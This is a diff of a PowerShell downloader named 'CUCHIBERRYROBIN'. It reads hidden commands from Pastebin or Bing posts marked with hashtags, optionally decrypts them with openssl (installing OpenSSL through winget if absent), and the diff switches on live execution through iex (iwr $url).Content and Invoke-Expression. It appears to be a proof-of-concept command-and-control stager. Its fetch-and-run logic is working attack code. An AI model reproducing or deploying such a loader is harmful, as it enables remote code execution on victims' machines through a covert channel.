@@ -1,5 +1,5 @@
 ﻿#Downloader CUCHIBERRYROBIN
-$Conf_Hashtag_init="#CUCHIBERRYROBIN"
+$Conf_Hashtag_init="#11CUCHIBERRYROBIN"
 $Conf_Hashtag_end="#FIN"
 
 #Not working, need workaround to get from google 
@@ -24,10 +24,12 @@ $from="Bing"
 #TerceraA OPCION #TODO CIPHER XOR
 if (([string]::IsNullOrEmpty($resultado)))
 {
-$content = Invoke-WebRequest -Uri "https://pastebin.com/ABiV0rH7" -UseBasicParsing
+$content = Invoke-WebRequest -Uri "https://pastebin.com/raw/ABiV0rH7" -UseBasicParsing
 $patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
 $resultado = [regex]::Match($content, $patron).Value
 $from="Pastebin"
+
+Write-Output "PASTEBIN:"$resultado
 }
 
 $resultado=[System.Net.WebUtility]::HtmlDecode($resultado)
@@ -57,12 +59,14 @@ $patron = '\$\shttp[^\s]+'
 
 if ($resultado -match $patron) {
       $url = $matches[0] -replace '\$+',''
-    $resultado = "iex (iwr '$url' -UseBasicParsing).Content"
+    $resultado = iex (iwr $url -UseBasicParsing).Content
+    Write-Output "Comando $ :"$resultado
 }
 
 # Buscar la posición de "ñC detro de resultado, pero como no cabe, debe ir unido al $ una vez descargado"
 $posicion = $resultado.IndexOf('ñC')
 
+#SI HAY CIFRADO
 if ($posicion -ne -1) {
     # Extraer el contenido posterior a "ñC"
     $resultado = $resultado.Substring($posicion + 3) 
@@ -70,10 +74,17 @@ if ($posicion -ne -1) {
     
     $archivoTemporal = [System.IO.Path]::GetTempFileName()
     [IO.File]::WriteAllBytes($archivoTemporal, [Convert]::FromBase64String($resultado))
-    
-    $resultado = openssl pkeyutl -verifyrecover -in $archivoTemporal  -inkey private.der
 
-    
+    #VERIFICO SI TIENE INSTALADO EL OPENSSL
+    # Verificar si OpenSSL está instalado
+    $opensslInstalled = Get-Command openssl -ErrorAction SilentlyContinue
+
+    if (-not $opensslInstalled) { 
+    winget install --id OpenSSL.OpenSSL
+    }
+        $resultado = openssl pkeyutl -verifyrecover -in $archivoTemporal  -inkey private.der
+
+           
 
 $Title = "CuchiBerryRObin"
 $Message = "Descifrando comando Robin Cifrado"
@@ -86,12 +97,19 @@ $notify = new-object system.windows.forms.notifyicon
 $notify.icon = $icon
 $notify.visible = $true
 $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
-} 
+}
+
+
+    
+
+
+ 
+
 
 Write-Output "COMANDO:"$resultado
 
 
-#Invoke-Expression $resultado
+Invoke-Expression $resultado
 
 
 
